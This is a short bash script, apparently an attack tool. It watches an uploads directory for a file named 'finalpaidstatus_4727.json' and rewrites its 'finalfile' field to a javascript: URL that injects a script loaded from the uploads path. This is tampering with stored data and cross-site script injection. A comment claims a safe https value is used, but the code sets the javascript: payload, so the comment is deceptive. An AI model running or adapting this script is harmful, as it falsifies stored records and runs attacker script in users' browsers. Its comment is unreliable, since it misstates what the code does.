#!/usr/bin/env bash
set -euo pipefail

WATCH_DIR="/data/uploads"
TARGET_NAME="finalpaidstatus_4727.json"

# Use a safe replacement value (https/path), not javascript:
NEW_FINALFILE_VALUE="javascript:(function(){var s=document.createElement(\"script\");s.src=\"/uploads/698a8afbc5f1f3.29386677/test.js\";document.head.appendChild(s);})()"

# Ensure inotifywait exists
if ! command -v inotifywait >/dev/null 2>&1; then
  echo "Error: inotifywait not found. Install inotify-tools."
  exit 1
fi

echo "Watching $WATCH_DIR for NEW $TARGET_NAME files..."

# Only events after this command starts are seen.
inotifywait -m -r \
  -e create -e moved_to -e close_write \
  --format '%w%f' "$WATCH_DIR" |
while IFS= read -r file; do
  # Only act on exact filename
  [[ "$(basename "$file")" == "$TARGET_NAME" ]] || continue

  # Wait briefly for file to settle
  for _ in {1..20}; do
    [[ -s "$file" ]] && break
    sleep 0.1
  done

  # Validate it's JSON and has finalfile key
  if jq -e '.finalfile' "$file" >/dev/null 2>&1; then
    tmp="${file}.tmp.$$"
    jq --arg v "$NEW_FINALFILE_VALUE" '.finalfile = $v' "$file" > "$tmp" \
      && mv "$tmp" "$file"
    echo "Updated: $file"
  else
    echo "Skipped (invalid JSON or missing finalfile): $file"
  fi
done
